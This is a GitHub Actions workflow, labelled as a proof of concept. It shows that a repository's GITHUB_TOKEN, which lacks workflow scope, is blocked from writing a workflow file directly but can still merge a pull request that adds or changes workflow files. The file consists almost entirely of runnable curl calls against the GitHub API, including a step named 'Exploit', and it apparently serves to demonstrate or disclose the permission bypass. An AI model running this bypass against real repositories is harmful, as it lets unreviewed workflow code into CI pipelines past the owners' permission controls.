name: PoC - Merge PR with GITHUB_TOKEN
on:
  workflow_dispatch:
    inputs:
      pr_number:
        description: 'PR number to merge'
        required: true
        type: string

permissions:
  contents: write
  pull-requests: write

jobs:
  merge:
    runs-on: ubuntu-latest
    steps:
      - name: Show GITHUB_TOKEN permissions
        run: |
          echo "=== This workflow uses GITHUB_TOKEN ==="
          echo "=== GITHUB_TOKEN has NO workflow scope ==="
          echo "Attempting to merge PR #${{ inputs.pr_number }}..."
          
      - name: Verify - Direct workflow modification is blocked
        run: |
          RESULT=$(curl -s -w "%{http_code}" -o /tmp/res.json \
            -X PUT \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/contents/.github/workflows/should-fail.yml" \
            -d '{"message":"direct create","content":"bmFtZTogdGVzdAo=","branch":"main"}')
          echo "Direct workflow creation: HTTP $RESULT"
          cat /tmp/res.json | jq -r '.message // empty'
          
      - name: Exploit - Merge PR with workflow changes
        run: |
          curl -s -w "\nHTTP:%{http_code}" \
            -X PUT \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/pulls/${{ inputs.pr_number }}/merge" \
            -d '{"merge_method":"merge","commit_title":"PoC: GITHUB_TOKEN merged workflow change"}'
          
      - name: Verify result
        run: |
          curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            "https://api.github.com/repos/${{ github.repository }}/contents/.github/workflows/dummy.yml" \
            | jq -r '.content' | base64 -d
